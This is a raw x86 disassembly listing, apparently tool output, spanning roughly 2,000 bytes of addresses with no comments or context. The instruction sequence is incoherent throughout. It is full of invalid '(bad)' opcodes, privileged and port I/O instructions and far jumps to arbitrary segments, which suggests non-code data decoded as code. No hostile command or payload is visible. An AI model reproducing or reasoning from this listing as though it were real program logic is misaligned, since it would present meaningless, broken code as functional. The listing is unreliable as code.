  411142:	aas    
  411143:	bound  edx,QWORD PTR [ecx+eiz*2-0x32]
  411147:	and    edx,eax
  411149:	rol    BYTE PTR [esi-0x21695e7f],1
  41114f:	jle    0x4110da
  411151:	shl    BYTE PTR [ebx+0x6055dafd],0x52
  411158:	pushf  
  411159:	jno    0x4110f3
  41115b:	int    0xe8
  41115d:	dec    ecx
  41115e:	ins    DWORD PTR es:[edi],dx
  41115f:	imul   edx,esp,0xffffffe5
  411162:	xor    eax,0x270820ee
  411167:	xor    dh,BYTE PTR [ebp+0x61]
  41116a:	sbb    eax,0x83645dec
  41116f:	lahf   
  411170:	gs dec ebp
  411172:	bound  edi,QWORD PTR [esi+0x70f925d2]
  411178:	pushf  
  411179:	stc    
  41117a:	lds    ecx,FWORD PTR [ebx]
  41117c:	cmp    DWORD PTR [ecx],0xb
  41117f:	sub    al,0x10
  411181:	jno    0x411129
  411183:	cmp    BYTE PTR [ebp+0x44],bh
  411186:	adc    eax,0x204c3612
  41118b:	push   0x79
  41118d:	xchg   ebx,eax
  41118e:	and    eax,0x99493ba9
  411193:	push   ebx
  411194:	js     0x411128
  411196:	xchg   esp,eax
  411197:	xor    ah,BYTE PTR [ebp+0x67fb914]
  41119d:	pusha  
  41119e:	das    
  41119f:	jmp    0x6137:0x947ff2e0
  4111a6:	mov    ss,WORD PTR [edi+ecx*2-0x7d4459dd]
  4111ad:	push   edi
  4111ae:	add    eax,DWORD PTR [ecx+0x9]
  4111b1:	dec    ebx
  4111b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111b3:	xor    al,0xc9
  4111b5:	cmp    esp,eax
  4111b7:	out    dx,eax
  4111b8:	mov    bl,0xec
  4111ba:	inc    ecx
  4111bb:	pop    edx
  4111bc:	inc    ebx
  4111bd:	pop    ss
  4111be:	dec    edi
  4111bf:	pop    ebx
  4111c0:	dec    ebp
  4111c1:	adc    eax,0xf834a23c
  4111c6:	wbinvd 
  4111c8:	repz mov esi,DWORD PTR [esi-0x31c905b4]
  4111cf:	xchg   edi,eax
  4111d0:	sbb    DWORD PTR [ebp-0x31d83389],0x32fab0eb
  4111da:	mov    eax,0xc303f8e2
  4111df:	hlt    
  4111e0:	iret   
  4111e1:	xor    edx,DWORD PTR [ecx+0x34]
  4111e4:	mov    ch,BYTE PTR [edi+0x57]
  4111e7:	sar    BYTE PTR [ebx],1
  4111e9:	lds    ebx,FWORD PTR [eax+ecx*1+0x1df47cb6]
  4111f0:	jmp    0xdb75f754
  4111f5:	sbb    BYTE PTR [ecx+ecx*4+0x2076a8a8],bh
  4111fc:	into   
  4111fd:	hlt    
  4111fe:	cmp    eax,0x595d344e
  411203:	mov    bl,0xa0
  411205:	xor    al,0x64
  411207:	and    bh,BYTE PTR [ecx+0x6b]
  41120a:	dec    eax
  41120b:	xchg   esp,eax
  41120c:	pop    esi
  41120d:	push   edi
  41120e:	dec    esi
  41120f:	sbb    DWORD PTR ds:0xcdd372f2,edi
  411215:	outs   dx,DWORD PTR ds:[esi]
  411216:	dec    esp
  411217:	jle    0x4111ec
  411219:	xor    dh,cl
  41121b:	or     BYTE PTR [ecx+0x66],0xd9
  41121f:	fild   QWORD PTR [ecx+0x7]
  411222:	push   edi
  411223:	mov    ch,0x4
  411225:	test   eax,0xb374515
  41122a:	sbb    eax,eax
  41122c:	sub    al,0x6f
  41122e:	sbb    al,0xd
  411230:	mov    bh,0x2c
  411232:	sub    al,0xc0
  411234:	dec    edx
  411235:	jecxz  0x4111f6
  411237:	out    0xca,eax
  411239:	cld    
  41123a:	push   eax
  41123b:	xchg   ebx,eax
  41123c:	adc    bh,ch
  41123e:	fs out 0x1c,al
  411241:	cwde   
  411242:	sahf   
  411243:	mov    bh,0x6d
  411245:	pop    es
  411246:	into   
  411247:	in     al,dx
  411248:	jbe    0x411200
  41124a:	cdq    
  41124b:	xchg   edx,eax
  41124c:	fld    st(0)
  41124e:	lods   al,BYTE PTR ds:[esi]
  41124f:	nop
  411250:	je     0x411200
  411252:	fbld   TBYTE PTR [eax-0x2d]
  411255:	dec    ebx
  411256:	and    dl,BYTE PTR [esi-0x3f]
  411259:	enter  0xfd58,0xf3
  41125d:	lea    ebp,[edx]
  41125f:	lds    ecx,FWORD PTR [edi+0x7c1b0340]
  411265:	mov    ebp,eax
  411267:	jne    0x411295
  411269:	cli    
  41126a:	xor    al,BYTE PTR [ebx-0x77]
  41126d:	mov    bh,0x1c
  41126f:	rol    bh,cl
  411271:	leave  
  411272:	sti    
  411273:	sbb    al,BYTE PTR [edx-0x4b9729c]
  411279:	pop    eax
  41127a:	sub    eax,0x121a2698
  41127f:	add    DWORD PTR [ebp-0x67],esi
  411282:	xchg   edi,eax
  411283:	xchg   esi,eax
  411284:	enter  0xf531,0x77
  411288:	fidiv  WORD PTR [ebp-0x36d16247]
  41128e:	lea    edx,[esp+ebx*4]
  411291:	mov    bh,0x25
  411293:	(bad)  
  411294:	cdq    
  411295:	clc    
  411296:	cld    
  411297:	sbb    ah,BYTE PTR [esi]
  411299:	fldenv [eiz*1-0x652af88f]
  4112a0:	popa   
  4112a1:	jle    0x8c40a6cc
  4112a7:	pop    ebp
  4112a8:	add    DWORD PTR [eax+0x6f],esp
  4112ab:	ror    BYTE PTR [ebx+0x1b769be6],1
  4112b1:	fst    DWORD PTR [esp+eax*4+0x1e]
  4112b5:	sub    eax,0x46abd9b
  4112ba:	out    0xe9,al
  4112bc:	outs   dx,DWORD PTR ds:[esi]
  4112bd:	inc    ebx
  4112be:	adc    ch,dl
  4112c0:	shr    ecx,cl
  4112c2:	cmc    
  4112c3:	daa    
  4112c4:	adc    BYTE PTR [ebx+0x26e88978],dl
  4112ca:	popf   
  4112cb:	sub    BYTE PTR [ecx+0x1a7af63a],al
  4112d1:	not    DWORD PTR [ecx+0x21da9341]
  4112d7:	outs   dx,DWORD PTR ds:[esi]
  4112d8:	push   esi
  4112d9:	xor    al,0xcc
  4112db:	xchg   esp,eax
  4112dc:	sti    
  4112dd:	out    dx,al
  4112de:	adc    BYTE PTR [eax],al
  4112e0:	cmp    al,0x3c
  4112e2:	or     al,0x64
  4112e4:	xchg   esi,ebx
  4112e6:	and    BYTE PTR [ebp+eax*8-0x6b],al
  4112ea:	mov    ds:0x10bc7f4d,eax
  4112ef:	pop    edi
  4112f0:	stos   DWORD PTR es:[edi],eax
  4112f1:	mov    bl,bl
  4112f3:	shl    DWORD PTR [esi+edi*8],cl
  4112f6:	and    eax,DWORD PTR [edi+0x2f10275a]
  4112fc:	inc    esp
  4112fd:	(bad)  
  4112fe:	cli    
  4112ff:	jecxz  0x41129c
  411301:	mov    dl,0x6b
  411303:	je     0x411335
  411305:	fild   QWORD PTR [ecx-0x7b]
  411308:	aas    
  411309:	sub    BYTE PTR [esi-0x74634be6],bl
  41130f:	inc    edi
  411310:	xor    cl,BYTE PTR [ebx-0x4b]
  411313:	xchg   edi,eax
  411314:	xchg   edx,eax
  411315:	popf   
  411316:	jg     0x411352
  411318:	inc    esi
  411319:	popa   
  41131a:	jle    0x411305
  41131c:	jg     0x41139b
  41131e:	push   es
  41131f:	mov    edx,0xd3c6b047
  411324:	sbb    cl,BYTE PTR [edi]
  411326:	aad    0x4b
  411328:	sbb    edi,DWORD PTR [edi+esi*2]
  41132b:	or     dl,ch
  41132d:	stos   BYTE PTR es:[edi],al
  41132e:	std    
  41132f:	nop
  411330:	cmp    eax,0x8e3d6574
  411335:	push   0xc7fbc826
  41133a:	(bad)  
  41133b:	mov    ebx,0xa757e357
  411340:	ds cmp al,0xc7
  411343:	iret   
  411344:	test   eax,0xb65755a
  411349:	and    dl,ch
  41134b:	jge    0x4112dd
  41134d:	xlat   BYTE PTR ds:[ebx]
  41134e:	sbb    ecx,DWORD PTR [ebx-0xafb05b3]
  411354:	aam    0xca
  411356:	shl    bh,cl
  411358:	xor    ebp,ebx
  41135a:	jo     0x4112ec
  41135c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41135d:	xchg   DWORD PTR [ecx],edi
  41135f:	push   ebx
  411360:	mov    WORD PTR [ebp+0x3722804e],es
  411366:	cwde   
  411367:	mov    edx,0x5e6f62cd
  41136c:	xchg   edi,eax
  41136d:	ret    
  41136e:	adc    bh,BYTE PTR [ecx-0x38]
  411371:	and    edx,DWORD PTR [ebp+0x36]
  411374:	cmp    al,0x7d
  411376:	mov    dl,0xdd
  411378:	popa   
  411379:	repnz ror DWORD PTR [ecx+0x33],0x1b
  41137e:	pop    esi
  41137f:	imul   esi,DWORD PTR [ebx+0x14755b57],0xffffffc4
  411386:	mov    bh,0xf7
  411388:	xchg   edi,eax
  411389:	xchg   ecx,eax
  41138a:	retf   
  41138b:	dec    esi
  41138c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41138d:	or     eax,0xac26635f
  411392:	hlt    
  411393:	xchg   DWORD PTR [edx+0x7d2e8769],ebp
  411399:	xor    esi,esp
  41139b:	je     0x411404
  41139d:	jae    0x41141d
  41139f:	outs   dx,BYTE PTR ds:[esi]
  4113a0:	shr    bl,0xbd
  4113a3:	push   edx
  4113a4:	std    
  4113a5:	cmp    eax,0x43ff48a
  4113aa:	xor    BYTE PTR [ebx],ah
  4113ac:	dec    ebx
  4113ad:	ins    DWORD PTR es:[edi],dx
  4113ae:	sub    eax,0x7a5948e9
  4113b3:	neg    BYTE PTR [edx-0x1d28c25]
  4113b9:	out    dx,al
  4113ba:	dec    ecx
  4113bb:	or     ah,al
  4113bd:	sub    eax,0x223efd1
  4113c2:	out    dx,eax
  4113c3:	and    dh,BYTE PTR [ecx+0x2c]
  4113c6:	sbb    eax,esi
  4113c8:	xchg   esi,eax
  4113c9:	mov    esi,0x6b696477
  4113ce:	cli    
  4113cf:	mov    esp,DWORD PTR [edx+0x374d403a]
  4113d5:	mov    edi,0xa297b5ad
  4113da:	(bad)  
  4113db:	xlat   BYTE PTR ds:[ebx]
  4113dc:	mov    edi,DWORD PTR [esi]
  4113de:	lock fild DWORD PTR [edx]
  4113e1:	inc    esp
  4113e2:	mov    bh,0xdd
  4113e4:	aaa    
  4113e5:	out    dx,eax
  4113e6:	xlat   BYTE PTR ds:[ebx]
  4113e7:	jp     0x4113ea
  4113e9:	add    eax,0xae9d275e
  4113ee:	shl    ah,0xee
  4113f1:	mov    ss,esi
  4113f3:	add    DWORD PTR [ebx+0x7],ebp
  4113f6:	add    eax,0xc9724880
  4113fb:	xchg   edx,eax
  4113fc:	bound  esp,QWORD PTR [eax-0x583b042a]
  411402:	and    cl,BYTE PTR fs:[edx-0x6d]
  411406:	add    dl,dl
  411408:	pop    edx
  411409:	inc    ebx
  41140a:	imul   edi,DWORD PTR [edi-0x5a],0x41
  41140e:	das    
  41140f:	fcmovb st,st(7)
  411411:	and    BYTE PTR [ecx],ch
  411413:	dec    BYTE PTR [esi]
  411415:	sub    eax,0xe875cc44
  41141a:	and    BYTE PTR [eax+0x4a],al
  41141d:	dec    DWORD PTR [esi-0x3a]
  411420:	fld    QWORD PTR [esi]
  411422:	lahf   
  411423:	ds (bad) 
  411425:	stc    
  411426:	push   cs
  411427:	inc    esp
  411428:	outs   dx,DWORD PTR ds:[esi]
  411429:	xor    ch,BYTE PTR [ebx]
  41142b:	and    ebp,DWORD PTR [edx+0x6c8afef4]
  411431:	lods   eax,DWORD PTR ds:[esi]
  411432:	add    bh,BYTE PTR [ecx+0x688b8bb6]
  411438:	mov    WORD PTR [eax+esi*4+0x3c],es
  41143c:	cdq    
  41143d:	inc    edx
  41143e:	(bad)  
  41143f:	jbe    0x4113c5
  411441:	mov    cl,0xff
  411443:	out    dx,al
  411444:	les    esi,FWORD PTR [ebp+0x3f]
  411447:	(bad)  
  411448:	or     DWORD PTR [edi-0x1fed09ef],edx
  41144e:	cmp    ebp,DWORD PTR [ebp-0x3352425d]
  411454:	mov    eax,ds:0xae468bdc
  411459:	cmc    
  41145a:	test   eax,0x9593b709
  41145f:	int3   
  411460:	jo     0x411480
  411462:	cmove  edx,edx
  411465:	(bad)  
  411466:	lods   al,BYTE PTR ds:[esi]
  411467:	sti    
  411468:	add    eax,DWORD PTR [eax-0x71cfbd20]
  41146e:	addr16 je 0x411415
  411471:	inc    ecx
  411472:	cmp    ebx,DWORD PTR [edi+0x3fa4ef73]
  411478:	adc    DWORD PTR [ebx+ecx*2+0x50d30e1b],ebp
  41147f:	push   ebp
  411480:	adc    DWORD PTR [eax],esi
  411482:	daa    
  411483:	inc    esi
  411484:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411485:	ss repnz icebp 
  411488:	cmp    BYTE PTR ss:[ebp+0x6d],dl
  41148c:	sub    eax,0x13fd390e
  411491:	scas   eax,DWORD PTR es:[edi]
  411492:	jae    0x4114c2
  411494:	sar    DWORD PTR [ebx-0x52],1
  411497:	mov    edi,0x39479ccf
  41149c:	arpl   WORD PTR [edi],dx
  41149e:	lds    ebp,FWORD PTR [ecx+0xc14477a]
  4114a4:	icebp  
  4114a5:	or     ecx,DWORD PTR [ecx]
  4114a7:	jns    0x4114ef
  4114a9:	repnz dec esp
  4114ab:	inc    ebp
  4114ac:	clc    
  4114ad:	sbb    dh,BYTE PTR [edi+0xa065ace]
  4114b3:	in     al,dx
  4114b4:	mul    bh
  4114b6:	ds mov bh,0xaf
  4114b9:	xchg   ebx,eax
  4114ba:	inc    ebp
  4114bb:	adc    eax,0x65c7730c
  4114c0:	jbe    0x4114c8
  4114c2:	pusha  
  4114c3:	repz cli 
  4114c5:	outs   dx,DWORD PTR ds:[esi]
  4114c6:	pop    ecx
  4114c7:	dec    ebx
  4114c8:	xchg   esi,eax
  4114c9:	jo     0x4114ce
  4114cb:	shl    BYTE PTR [ebp+0x25],1
  4114ce:	sbb    cl,bh
  4114d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114d1:	add    eax,0x69d25bf0
  4114d6:	ret    0x2e4c
  4114d9:	outs   dx,DWORD PTR ds:[esi]
  4114da:	xor    eax,0x907b3c22
  4114df:	jp     0x4114b3
  4114e1:	mov    edi,0xf195ec1a
  4114e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114e7:	adc    cl,BYTE PTR [edi-0x1d]
  4114ea:	je     0x41155c
  4114ec:	inc    edx
  4114ed:	repnz pop esi
  4114ef:	lock out 0x32,al
  4114f2:	mov    BYTE PTR [ecx],al
  4114f4:	xchg   ebx,eax
  4114f5:	in     eax,dx
  4114f6:	push   ebp
  4114f7:	sahf   
  4114f8:	inc    eax
  4114f9:	aad    0xfa
  4114fb:	pop    ds
  4114fc:	pop    ss
  4114fd:	xor    bl,dl
  4114ff:	aas    
  411500:	leave  
  411501:	mov    ds:0x57c078f3,eax
  411506:	test   eax,0x12f0b5ff
  41150b:	das    
  41150c:	dec    ecx
  41150d:	imul   esi,esi,0x79
  411510:	add    al,0x39
  411512:	ins    DWORD PTR es:[edi],dx
  411513:	xchg   esi,eax
  411514:	loopne 0x4114e4
  411516:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411517:	rol    BYTE PTR [eax+esi*2+0x78],0xe
  41151c:	add    ecx,DWORD PTR [edi]
  41151e:	mov    ch,0x2b
  411520:	mov    BYTE PTR [ecx+edi*1+0x369dbb77],dh
  411527:	jns    0x4114d8
  411529:	jp     0x411563
  41152b:	lods   eax,DWORD PTR ds:[esi]
  41152c:	or     eax,0x32326f86
  411531:	mov    al,0x77
  411533:	jno    0x41153d
  411535:	nop
  411536:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411537:	lds    esi,FWORD PTR [edx-0x1aae74c0]
  41153d:	jle    0x4114f1
  41153f:	lods   al,BYTE PTR ds:[esi]
  411540:	shl    ah,1
  411542:	push   cs
  411543:	jne    0x41157b
  411545:	mov    eax,0x9aa1891
  41154a:	dec    ecx
  41154b:	adc    BYTE PTR [esi-0x6179df8b],0xe8
  411552:	in     eax,dx
  411553:	xor    al,bl
  411555:	retf   0x1ca3
  411558:	inc    eax
  411559:	daa    
  41155a:	sbb    ebp,ebx
  41155c:	push   edi
  41155d:	pop    ebx
  41155e:	aaa    
  41155f:	jl     0x41158e
  411561:	fxch   st(3)
  411563:	xor    al,ch
  411565:	jmp    0x8695:0xc145793
  41156c:	call   0x7ad651da
  411571:	push   eax
  411572:	pop    ebx
  411573:	sbb    bl,BYTE PTR [ecx]
  411575:	ja     0x41155a
  411577:	jbe    0x4115c6
  411579:	outs   dx,BYTE PTR ds:[esi]
  41157a:	xchg   esp,eax
  41157b:	inc    edx
  41157c:	sahf   
  41157d:	xchg   BYTE PTR [ebx+0x5d6b6e78],cl
  411583:	mov    edx,0xdea0b336
  411588:	fistp  WORD PTR [edx]
  41158a:	ja     0x411510
  41158c:	mov    esi,0xdc2aae2f
  411591:	fs je  0x41157b
  411594:	mov    ecx,0xaec785e4
  411599:	mov    eax,edi
  41159b:	bound  eax,QWORD PTR [edi-0x752cc058]
  4115a1:	add    BYTE PTR [eax+0xc74719e],ch
  4115a7:	ins    DWORD PTR es:[edi],dx
  4115a8:	xchg   ebp,eax
  4115a9:	sti    
  4115aa:	push   ecx
  4115ab:	xor    al,0xd8
  4115ad:	or     bl,al
  4115af:	mov    esi,0x6991f4e1
  4115b4:	shl    DWORD PTR [ecx-0x1f],1
  4115b7:	lods   al,BYTE PTR ds:[esi]
  4115b8:	sbb    eax,0x9ddca613
  4115bd:	push   ebx
  4115be:	mov    ebp,0xe7cfbd54
  4115c3:	jg     0x411615
  4115c5:	pusha  
  4115c6:	adc    BYTE PTR [edx+0x50],0x71
  4115ca:	push   ecx
  4115cb:	jg     0x4115a5
  4115cd:	xor    esp,ebp
  4115cf:	aad    0xef
  4115d1:	lock test BYTE PTR ds:0x47557a45,al
  4115d8:	or     edi,DWORD PTR [esi+edx*4+0x22]
  4115dc:	mov    DWORD PTR [edi],edx
  4115de:	xchg   BYTE PTR [ecx],bh
  4115e0:	int3   
  4115e1:	pop    es
  4115e2:	or     eax,0x8dbcc6d5
  4115e7:	mov    edx,0xe78913e3
  4115ec:	and    al,0x70
  4115ee:	lods   al,BYTE PTR ds:[esi]
  4115ef:	mov    bh,BYTE PTR [edi]
  4115f1:	mov    eax,ds:0x17219100
  4115f6:	test   DWORD PTR [ebp+edi*4-0x122d2515],0x4234bed5
  411601:	push   ebp
  411602:	mov    ds,WORD PTR [edi]
  411604:	cmp    bl,bl
  411606:	enter  0xef4e,0x44
  41160a:	cs and eax,0x36976fa4
  411610:	bnd jae 0x41160f
  411613:	jbe    0x411655
  411615:	sbb    dl,BYTE PTR [ecx]
  411617:	push   ss
  411618:	loop   0x4115c2
  41161a:	stos   DWORD PTR es:[edi],eax
  41161b:	popf   
  41161c:	lahf   
  41161d:	jns    0x41167e
  41161f:	scas   eax,DWORD PTR es:[edi]
  411620:	jo     0x411639
  411622:	add    dl,BYTE PTR [ebx]
  411624:	shr    DWORD PTR [ebp-0x2d],cl
  411627:	pop    es
  411628:	dec    ecx
  411629:	(bad)  
  41162a:	shl    BYTE PTR [edx+0xf09a354],cl
  411630:	xor    ch,bh
  411632:	inc    ebx
  411633:	in     al,dx
  411634:	jl     0x411666
  411636:	lds    edi,FWORD PTR [ebx+0x6ef81206]
  41163c:	lods   al,BYTE PTR ds:[esi]
  41163d:	out    dx,al
  41163e:	fcomp  QWORD PTR [edx-0x743b2226]
  411644:	aas    
  411645:	mov    esi,DWORD PTR [ebp+0x4c8443a8]
  41164b:	loope  0x411641
  41164d:	push   ecx
  41164e:	fwait
  41164f:	outs   dx,BYTE PTR ds:[esi]
  411650:	push   ecx
  411651:	mov    dl,0x18
  411653:	dec    edi
  411654:	fiadd  WORD PTR [ecx-0xc]
  411657:	(bad)  
  411659:	clc    
  41165a:	ins    DWORD PTR es:[edi],dx
  41165b:	adc    bl,BYTE PTR [edx-0x58ea0e8c]
  411661:	ret    
  411662:	ins    BYTE PTR es:[edi],dx
  411663:	retf   0x557b
  411666:	imul   ecx,DWORD PTR [edi+eiz*2],0x74
  41166a:	bound  edx,QWORD PTR [ebx+0x6c]
  41166d:	sti    
  41166e:	call   0xc3601bb
  411673:	sti    
  411674:	test   al,0xe8
  411676:	sbb    ah,BYTE PTR [edi+eax*1+0x5e]
  41167a:	scas   al,BYTE PTR es:[edi]
  41167b:	das    
  41167c:	mov    al,0xed
  41167e:	stos   BYTE PTR es:[edi],al
  41167f:	pop    ebx
  411680:	fild   QWORD PTR [ebx-0x72]
  411683:	and    BYTE PTR [ebx],0x2e
  411686:	sbb    edi,esp
  411688:	inc    edi
  411689:	test   BYTE PTR [ebp-0xd],cl
  41168c:	or     ebp,DWORD PTR [eax-0x7c30f09f]
  411692:	iret   
  411693:	lods   eax,DWORD PTR ds:[esi]
  411694:	sbb    eax,0x50373482
  411699:	nop
  41169a:	add    DWORD PTR ds:[ebx],esi
  41169d:	leave  
  41169e:	fidiv  WORD PTR [ebx+0x70ff4da4]
  4116a4:	dec    ebx
  4116a5:	pop    eax
  4116a6:	addr16 (bad) 
  4116a8:	xor    BYTE PTR [edx-0x1bb6843],al
  4116ae:	loopne 0x411717
  4116b0:	(bad)  
  4116b1:	gs xor edi,edi
  4116b4:	rcl    BYTE PTR [edx+0x1e],0x1c
  4116b8:	out    dx,eax
  4116b9:	push   esi
  4116ba:	jg     0x4116dd
  4116bc:	xor    al,0xa8
  4116be:	jmp    0xa2e1:0x47c7c0bf
  4116c5:	cs and al,0xd
  4116c8:	cmp    DWORD PTR [ebx+eax*8-0x7b],0x20
  4116cd:	xchg   edx,eax
  4116ce:	cmp    DWORD PTR [esi],esi
  4116d0:	jmp    0x9e27:0xf80dae75
  4116d7:	hlt    
  4116d8:	add    bl,BYTE PTR [esi+0x4f]
  4116db:	sub    ah,BYTE PTR [ebx+0x48]
  4116de:	xchg   edx,eax
  4116df:	add    DWORD PTR [eax+0x3cf752b6],edi
  4116e5:	(bad)  
  4116e6:	adc    edx,ebx
  4116e8:	xor    al,0xb7
  4116ea:	pushf  
  4116eb:	cwde   
  4116ec:	and    ah,ah
  4116ee:	xchg   ebx,edx
  4116f0:	std    
  4116f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116f2:	fld    DWORD PTR [esi-0x270f778b]
  4116f8:	mov    edi,DWORD PTR ds:0x4d7ee9ba
  4116fe:	cmc    
  4116ff:	adc    BYTE PTR [ebx+0x7dc0cfa5],bh
  411705:	jo     0x411742
  411707:	dec    esp
  411708:	(bad)  
  411709:	pop    edi
  41170a:	mov    dh,0x89
  41170c:	fidivr DWORD PTR [esi]
  41170e:	and    al,BYTE PTR [esi-0x20]
  411711:	les    ebx,FWORD PTR ds:0x51e53c49
  411717:	repz pop ebp
  411719:	test   BYTE PTR [ebx+0x76],ch
  41171c:	ret    
  41171d:	gs sahf 
  41171f:	in     eax,0x66
  411721:	not    BYTE PTR [ebp+0x78]
  411724:	fnstenv [edi+edx*2-0xc]
  411728:	faddp  st(7),st
  41172a:	sbb    DWORD PTR [esi+0x9],edx
  41172d:	inc    esp
  41172e:	push   cs
  41172f:	mov    esi,0xa35e8460
  411734:	dec    ebx
  411735:	in     eax,0x42
  411737:	mov    cl,0x90
  411739:	into   
  41173a:	cmp    al,0xf8
  41173c:	xor    al,0x36
  41173e:	jecxz  0x4116cc
  411740:	sbb    al,dh
  411742:	(bad)  [esi-0x5fd43673]
  411748:	pop    ebp
  411749:	sbb    bh,ch
  41174b:	in     eax,dx
  41174c:	test   BYTE PTR [edi+0x7d],bh
  41174f:	xor    eax,0x224e2702
  411754:	test   BYTE PTR [ebp+0x20c006d7],dl
  41175a:	xchg   BYTE PTR [edx+0x21ee2a9f],bh
  411760:	test   eax,0x4eaca9f9
  411765:	sahf   
  411766:	jns    0x41170d
  411768:	imul   edi,DWORD PTR [eax+0x30e9a83a],0xffffffed
  41176f:	je     0x4117dc
  411771:	ins    BYTE PTR es:[edi],dx
  411772:	inc    edi
  411773:	push   ebp
  411774:	pop    ds
  411775:	icebp  
  411776:	hlt    
  411777:	sbb    bh,BYTE PTR [edx-0x52]
  41177a:	stos   DWORD PTR es:[edi],eax
  41177b:	mov    bh,0xb
  41177d:	out    dx,eax
  41177e:	imul   edx,DWORD PTR gs:[ebp-0x21b8e95b],0xfffffffe
  411786:	or     eax,0x9fa891ac
  41178b:	dec    ebp
  41178c:	or     DWORD PTR [eax-0x4ccd0b33],0xb6320d6
  411796:	mov    edi,0xb7506c4e
  41179b:	or     ecx,DWORD PTR [esi]
  41179d:	dec    esi
  41179e:	mov    edx,0x57d1c427
  4117a3:	jle    0x4117de
  4117a5:	add    dh,BYTE PTR [eax-0x7cefcd74]
  4117ab:	(bad)  
  4117ac:	sub    DWORD PTR [ebx-0x6a],0xffffffe1
  4117b0:	and    BYTE PTR [edi+0x4ad17153],bh
  4117b6:	aas    
  4117b7:	sbb    eax,edx
  4117b9:	clts   
  4117bb:	jo     0x411787
  4117bd:	push   ecx
  4117be:	push   0x40
  4117c0:	xor    eax,0x8f415753
  4117c5:	and    DWORD PTR [eax],ecx
  4117c7:	adc    al,0x9b
  4117c9:	ret    0x244d
  4117cc:	adc    DWORD PTR [esi],ebx
  4117ce:	sub    eax,0x48d22f21
  4117d3:	cwde   
  4117d4:	fs mov ebp,0xb979cfa3
  4117da:	and    dh,BYTE PTR [bx+si]
  4117dd:	adc    al,0x10
  4117df:	pop    ebp
  4117e0:	xchg   edx,eax
  4117e1:	jno    0x411831
  4117e3:	imul   eax,DWORD PTR [eax],0x64
  4117e6:	and    BYTE PTR [eax-0x4f],al
  4117e9:	sub    DWORD PTR cs:[eax],esp
  4117ec:	mov    ds:0x1a9a8943,eax
  4117f1:	fisub  DWORD PTR [edx-0x7e5ff7e]
  4117f7:	add    BYTE PTR ds:0x446a,ah
  4117fc:	jo     0x4117e8
  4117fe:	mov    al,ds:0xf40e47cb
  411803:	pop    esi
  411804:	dec    DWORD PTR [esi+0x4e]
  411807:	jae    0x4117de
  411809:	loop   0x411886
  41180b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41180c:	push   0xefd9eef5
  411811:	mov    cl,0x6e
  411813:	pop    eax
  411814:	xor    cl,dh
  411816:	xchg   edx,eax
  411817:	adc    DWORD PTR [edx+ecx*8-0x68],edx
  41181b:	cmp    BYTE PTR [ecx],bl
  41181d:	and    al,BYTE PTR [edi+0x3091883e]
  411823:	sahf   
  411824:	out    0x26,al
  411826:	lods   al,BYTE PTR ds:[esi]
  411827:	xor    ah,BYTE PTR [esi]
  411829:	inc    ecx
  41182a:	mov    ebx,0xf4bcc1aa
  41182f:	and    al,0x4a
  411831:	mov    ebx,0xe2d3052b
  411836:	jmp    0x149dd526
  41183b:	push   esi
  41183c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41183d:	(bad)  
  41183f:	sbb    al,0x69
  411841:	jne    0x41186d
  411843:	pop    esi
  411844:	inc    ecx
  411845:	test   eax,0x3731c264
  41184a:	arpl   WORD PTR [ebp+ebx*1-0x2e69a5b9],bp
  411851:	es push ebx
  411853:	and    eax,0x5e571d18
  411858:	dec    esp
  411859:	call   0xcdc8:0xbf9394bf
  411860:	push   cs
  411861:	je     0x4118a8
  411863:	es fcmovb st,st(3)
  411866:	push   edi
  411867:	ret    0x8275
  41186a:	inc    edx
  41186b:	mov    DWORD PTR [ebp-0x66],edx
  41186e:	mov    eax,ds:0x1c04e861
  411873:	jns    0x411840
  411875:	popf   
  411876:	retf   0x1c3f
  411879:	or     al,BYTE PTR [ebx]
  41187b:	test   eax,0xe9703aac
  411880:	ins    DWORD PTR es:[edi],dx
  411881:	sbb    al,0xaf
  411883:	xchg   BYTE PTR ds:0x20b489d8,cl
  411889:	outs   dx,BYTE PTR ds:[esi]
  41188a:	mov    WORD PTR [edi-0x1c],gs
  41188d:	stos   BYTE PTR es:[edi],al
  41188e:	mov    bh,0x17
  411890:	push   ds
  411891:	xchg   esp,eax
  411892:	aaa    
  411893:	stos   BYTE PTR es:[edi],al
  411894:	inc    ebp
  411895:	push   esp
  411896:	dec    ecx
  411897:	sbb    eax,0x129dc1c0
  41189c:	jl     0x41183f
  41189e:	mov    eax,0x4bf6cb65
  4118a3:	adc    dl,BYTE PTR [edi-0x4]
  4118a6:	xor    esp,ebx
  4118a8:	stc    
  4118a9:	sbb    bh,al
  4118ab:	inc    eax
  4118ac:	and    DWORD PTR [ecx-0x351b22c6],0x4de96f34
  4118b6:	arpl   WORD PTR [eax],ax
  4118b8:	fucomp st(7)
  4118ba:	out    0x13,eax
  4118bc:	or     eax,0xe20a6ba3
  4118c1:	or     DWORD PTR [ecx],eax
  4118c3:	fstp   TBYTE PTR [ebx-0x49e5e317]
  4118c9:	gs fwait
  4118cb:	neg    DWORD PTR [esi]
  4118cd:	add    bl,ch
  4118cf:	pop    edx
  4118d0:	mov    dl,0xf
  4118d2:	mul    BYTE PTR [ecx-0x1]
  4118d5:	cmp    BYTE PTR [edi-0x2],0xa8
  4118d9:	or     esp,esi
  4118db:	rcr    DWORD PTR [ecx+0x7e],0xa1
  4118df:	outs   dx,DWORD PTR ds:[esi]
  4118e0:	xchg   edi,eax
  4118e1:	loopne 0x411876
  4118e3:	pop    ecx
  4118e4:	inc    edi
  4118e5:	stc    
  4118e6:	add    eax,0x6c00bd4a
  4118eb:	gs or  ebx,eax
  4118ee:	push   edx
  4118ef:	std    
  4118f0:	repnz std 
  4118f2:	int3   
  4118f3:	imul   eax,DWORD PTR [ecx+0x3263f29d],0x4f91bbec
  4118fd:	sub    al,0x80
  4118ff:	imul   DWORD PTR ds:[edx-0x65c05a4f]
  411906:	lods   al,BYTE PTR ds:[esi]
  411907:	rcl    DWORD PTR [ecx+eiz*1],1
  41190a:	test   al,0x92
